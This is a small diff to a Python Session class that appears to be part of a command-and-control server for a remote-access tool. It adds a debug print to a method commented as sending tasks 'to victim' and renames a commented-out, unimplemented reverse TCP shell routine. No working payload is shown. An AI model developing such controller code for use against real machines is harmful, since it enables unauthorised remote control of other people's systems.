@@ -57,9 +57,11 @@ class Session(threading.Thread):
             return False        
         finally:
             self.connection.setblocking(1)
+            
     #sends task to victim
     def send_instruction(self, instruction):
         try:
+            print("sending instruction")
             self.connection.sendall(instruction.encode())
         except Exception as e:
             print(f"send_instruction: {e}")
@@ -74,9 +76,10 @@ class Session(threading.Thread):
             return None
     
     
+    
+    
     '''
-    #Reverse TCP shell
-    def run(self):
+    def run_module(self):
         while True:
             if self.active.wait():
                 #TODO:implement reverse TCP shell need to make the run() function in server threaded first so that this can run instead when active
@@ -87,4 +90,4 @@ class Session(threading.Thread):
                     break
 
         self.active.clear()
-        '''
+'''
